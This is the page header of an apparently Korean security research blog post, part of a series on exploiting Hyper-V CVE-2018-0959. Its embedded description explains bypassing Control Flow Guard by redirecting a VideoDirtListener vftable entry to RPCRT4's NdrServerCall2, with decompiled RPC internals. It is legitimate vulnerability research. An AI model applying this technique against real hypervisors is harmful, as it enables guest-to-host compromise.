

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xD30C;&amp;#xD2B8; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/09/30/pwndorei/newjeans-hyper-v-pt1/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 1 - Hyper-V Architecture&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/08/pwndorei/newjeans-hyper-v-pt2/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 2 - CVE-2018-0959 Analysis(1)&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/15/pwndorei/newjeans-hyper-v-pt3/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 3 - CVE-2018-0959 Analysis(2)&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/22/pwndorei/newjeans-hyper-v-pt4/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 4 - CVE-2018-0959 Exploit(1)&lt;/a&gt;&lt;br&gt;&lt;strong&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 5 - CVE-2018-0959 Exploit(2) (Here)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; &amp;#xC2DC;&amp;#xD5D8; &amp;#xB05D;&amp;#xB098;&amp;#xC11C; &amp;#xD589;&amp;#xBCF5;&amp;#xD55C; pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xD30C;&amp;#xD2B8; 4&amp;#xC5D0;&amp;#xC11C; DLL&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0C8;&amp;#xC5C8;&amp;#xC8E0;? &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB294; &amp;#xBAA8;&amp;#xB450; &amp;#xBAA8;&amp;#xC600;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC81C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Bypass-CFG&#34;&gt;&lt;a href=&#34;#Bypass-CFG&#34; class=&#34;headerlink&#34; title=&#34;Bypass CFG&#34;&gt;&lt;/a&gt;Bypass CFG&lt;/h1&gt;&lt;p&gt;Windows Server 2012 R2&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ROP&amp;#xB85C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; Windows 10 Version 1709&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBD88;&amp;#xD589;&amp;#xD558;&amp;#xAC8C;&amp;#xB3C4; OOB Read/Write&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC870;&amp;#xAE08; &lt;del&gt;&amp;#xB9CE;&amp;#xC774; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD558;&amp;#xACE0;&lt;/del&gt; &amp;#xD2B9;&amp;#xBCC4;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC720;&amp;#xCD9C;&amp;#xD55C; DLL &amp;#xC8FC;&amp;#xC18C;&amp;#xB4E4; &amp;#xC911;&amp;#xC5D0; &lt;code&gt;RPCRT4.dll&lt;/code&gt;&amp;#xC774; &amp;#xC788;&amp;#xAC74; &amp;#xAC83;&amp;#xC744; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC2DC;&amp;#xB098;&amp;#xC694;?  &amp;#xC774; RPC&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; CFG&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;Windows-RPC-Remote-Procedure-Call&#34;&gt;&lt;a href=&#34;#Windows-RPC-Remote-Procedure-Call&#34; class=&#34;headerlink&#34; title=&#34;Windows RPC(Remote Procedure Call)&#34;&gt;&lt;/a&gt;Windows RPC(Remote Procedure Call)&lt;/h2&gt;&lt;p&gt;Remote Procedure Call&amp;#xC774;&amp;#xB780; &amp;#xC6D0;&amp;#xACA9; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;(&amp;#xD568;&amp;#xC218;)&amp;#xB97C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xB85C;&amp;#xCEEC; &amp;#xD568;&amp;#xC218;&amp;#xC778; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xD574;&amp;#xC8FC;&amp;#xB294; &amp;#xAE30;&amp;#xC220;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image1.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows/win32/rpc/how-rpc-works&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC704; &amp;#xADF8;&amp;#xB9BC;&amp;#xC740; Windows RPC&amp;#xC758; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB97C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B8; &amp;#xADF8;&amp;#xB9BC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC640; &amp;#xC11C;&amp;#xBC84;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB098; &amp;#xD638;&amp;#xCD9C;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC744; &amp;#xADF8;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC544;&amp;#xB798;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; Stub&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xACE0; Stub&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; NDR(Network Data Representation)&amp;#xD3EC;&amp;#xB9F7;&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC0AC;&amp;#xC2E4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C; RPC&amp;#xC758; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB294; &amp;#xADF8;&amp;#xB2E5; &amp;#xC911;&amp;#xC694;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &amp;#xC11C;&amp;#xBC84; &amp;#xCE21;&amp;#xC5D0;&amp;#xC11C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC54C;&amp;#xBA74; &amp;#xCDA9;&amp;#xBD84;&amp;#xD558;&amp;#xC8E0;. &lt;/p&gt;
&lt;h3 id=&#34;NdrServerCall2&#34;&gt;&lt;a href=&#34;#NdrServerCall2&#34; class=&#34;headerlink&#34; title=&#34;NdrServerCall2&#34;&gt;&lt;/a&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB294; &amp;#xC11C;&amp;#xBC84;&amp;#xAC00; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xC218;&amp;#xC2E0;&amp;#xD558;&amp;#xBA74; &amp;#xC774;&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xB294; &amp;#xC694;&amp;#xCCAD;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; __stdcall &lt;span class=&#34;hljs-title&#34;&gt;NdrServerCall2&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PRPC_MESSAGE pRpcMsg)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; pdwStubPhase;
	pdwStubPhase = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	NdrStubCall2(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, pRpcMsg, &amp;amp;pdwStubPhase);
}&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&amp;#xB0B4;&amp;#xBD80;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC640; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD558;&amp;#xACE0; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC774;&amp;#xAC8C; CFG &amp;#xC6B0;&amp;#xD68C;&amp;#xB791; &amp;#xB300;&amp;#xCCB4; &amp;#xBB34;&amp;#xC2A8; &amp;#xC5F0;&amp;#xAD00;&amp;#xC774; &amp;#xC788;&amp;#xB294; &amp;#xAC78;&amp;#xAE4C;&amp;#xC694;? &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB294; &lt;code&gt;__stdcall&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xADDC;&amp;#xC57D;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACE0; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xB294; &lt;code&gt;RCX&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC804;&amp;#xB2EC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC758; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xADDC;&amp;#xC57D;&amp;#xC778; &lt;code&gt;thiscall&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC774; &lt;code&gt;RCX&lt;/code&gt;&amp;#xC5D0; &amp;#xAC1D;&amp;#xCCB4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xB294;&amp;#xB370;&amp;#xC694;? vftable&amp;#xC744; &amp;#xB36E;&amp;#xC5B4;&amp;#xC368;&amp;#xC11C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC81C;&amp;#xC5B4; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE38; &amp;#xC218;&amp;#xB294; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC740; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC81C;&amp;#xD55C;&amp;#xC801;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; vftable&amp;#xC5D0;&amp;#xC11C; &amp;#xD2B9;&amp;#xC815; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &lt;code&gt;RPCRT4!NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F0;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74; &lt;code&gt;VideoDirtListener&lt;/code&gt; &amp;#xC790;&amp;#xCCB4;&amp;#xAC00; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB85C; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD558;&amp;#xB294; &amp;#xC0C1;&amp;#xD669;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC640; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC640; &amp;#xAD00;&amp;#xB828; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image2.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC798; &amp;#xD45C;&amp;#xD604;&amp;#xB41C; &amp;#xADF8;&amp;#xB9BC;&amp;#xC774;&amp;#xB77C; &amp;#xAC00;&amp;#xC838;&amp;#xC654;&amp;#xB294;&amp;#xB370; x86&amp;#xC774;&amp;#xB124;&amp;#xC694; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xAC01; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xBCC4;&amp;#xB85C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD544;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;h4 id=&#34;RPC-MESSAGE&#34;&gt;&lt;a href=&#34;#RPC-MESSAGE&#34; class=&#34;headerlink&#34; title=&#34;RPC_MESSAGE&#34;&gt;&lt;/a&gt;&lt;code&gt;RPC_MESSAGE&lt;/code&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Buffer: &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;&lt;/li&gt;
&lt;li&gt;BufferLength: &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xAE38;&amp;#xC774;&lt;/li&gt;
&lt;li&gt;ProcNum: &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800; &amp;#xBC88;&amp;#xD638;, DispatchTable&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&lt;/li&gt;
&lt;li&gt;RpcInterfaceInformation: &lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&lt;h4 id=&#34;RPC-SERVER-INTERFACE&#34;&gt;&lt;a href=&#34;#RPC-SERVER-INTERFACE&#34; class=&#34;headerlink&#34; title=&#34;RPC_SERVER_INTERFACE&#34;&gt;&lt;/a&gt;&lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt;&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;InterpreterInfo: &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&lt;h4 id=&#34;MIDL-SERVER-INFO&#34;&gt;&lt;a href=&#34;#MIDL-SERVER-INFO&#34; class=&#34;headerlink&#34; title=&#34;MIDL_SERVER_INFO&#34;&gt;&lt;/a&gt;&lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;pStubDesc: &lt;code&gt;MIDL_STUB_DESC&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;,&lt;/li&gt;
&lt;li&gt;DispatchTable: &amp;#xD568;&amp;#xC218; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&lt;/li&gt;
&lt;li&gt;ProcString: &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;(&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD06C;&amp;#xAE30;, &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130; &amp;#xC218; &amp;#xB4F1;)&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/li&gt;
&lt;li&gt;FmtStringOffset: &amp;#xD2B9;&amp;#xC815; &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; ProcString &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xBC30;&amp;#xC5F4;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xB5A4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574;&amp;#xC57C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC62C;&amp;#xBC14;&amp;#xB974;&amp;#xAC8C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;NdrStubCall2&#34;&gt;&lt;a href=&#34;#NdrStubCall2&#34; class=&#34;headerlink&#34; title=&#34;NdrStubCall2&#34;&gt;&lt;/a&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xACB0;&amp;#xACFC;&amp;#xAC00; &amp;#xB108;&amp;#xBB34;&amp;#x2026; &amp;#xAE34; &amp;#xAD00;&amp;#xACC4;&amp;#xB85C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB2E4;&amp;#xC12F; &amp;#xB2E8;&amp;#xACC4;&amp;#xB85C; &amp;#xB098;&amp;#xB204;&amp;#xC5B4; &amp;#xC124;&amp;#xBA85; &amp;#xB4DC;&amp;#xB9AC;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Context Initialize(&lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Server Initialize(&lt;code&gt;NdrpServerInit&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Argument Parsing(&lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Invoke&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Exit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Context-Initialize&#34;&gt;&lt;a href=&#34;#Context-Initialize&#34; class=&#34;headerlink&#34; title=&#34;Context Initialize&#34;&gt;&lt;/a&gt;Context Initialize&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;nt __stdcall &lt;span class=&#34;hljs-title&#34;&gt;NdrStubCall2&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *pThis, &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *pChannel, PRPC_MESSAGE pRpcMsg, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *pdwStubPhase)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  pRpcMsga = pRpcMsg;
  v107 = pChannel;
  v101 = pRpcMsg;
  v108 = pdwStubPhase;
  memset_0(&amp;amp;pStubMsg, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(pStubMsg));
  v7 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v97 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v103 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  ProcNum = pRpcMsg-&amp;gt;ProcNum;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pThis )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    MIDL = pRpcMsg-&amp;gt;RpcInterfaceInformation-&amp;gt;InterpreterInfo;
    MIDL2 = MIDL;
    DispatchTable = MIDL-&amp;gt;DispatchTable;
  }
  MIDL_STUB_DESC = MIDL-&amp;gt;pStubDesc;
  ProcNum2 = ProcNum;
  ProcString = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)&amp;amp;MIDL-&amp;gt;ProcString[MIDL-&amp;gt;FmtStringOffset[ProcNum]];
  MulNdrpInitializeContextFromProc(&lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt;, ProcString, &amp;amp;NdrProcContext, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//Context Initialize&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NDR_PROC_CONTEXT&lt;/code&gt;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; ProcNum&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; 